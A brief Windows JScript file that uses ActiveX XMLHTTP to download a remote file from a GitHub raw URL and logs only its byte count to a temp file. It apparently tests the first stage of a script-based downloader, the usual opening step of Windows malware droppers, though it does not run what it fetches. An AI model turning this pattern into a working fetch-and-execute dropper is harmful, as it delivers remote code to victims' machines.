var fso=new ActiveXObject("Scripting.FileSystemObject");
var x=new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/c0",0);
x.send();
var log=fso.CreateTextFile("C:\\temp\\js_dl.txt",true);
log.WriteLine("Downloaded: "+x.responseBody.length+" bytes");
log.Close();
